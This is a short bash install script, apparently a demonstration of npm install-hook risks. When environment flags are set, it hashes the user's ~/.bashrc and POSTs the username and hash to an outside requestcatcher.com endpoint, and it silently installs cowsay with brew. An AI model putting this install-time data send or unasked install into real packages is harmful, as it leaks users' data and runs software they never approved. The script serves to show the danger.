#! /bin/bash
echo "script: install"

if ! [ -z "$DEMO_EXFILTRATION" ]; then
  # Visit https://npm-test-install-hook.requestcatcher.com/ to see responses
  bashrc_sha=$(cat "$HOME/.bashrc" | openssl dgst -sha256 | sed 's/^.* //')
  curl -X POST "https://npm-test-install-hook.requestcatcher.com/install" \
    -d "user=$USER&bashrc_sha=$bashrc_sha"
fi

if ! [ -z "$DEMO_BREW_INSTALL" ]; then
  brew install cowsay
  cowsay "Uh Oh! The install script in this npm package just installed cowsay using brew."
fi

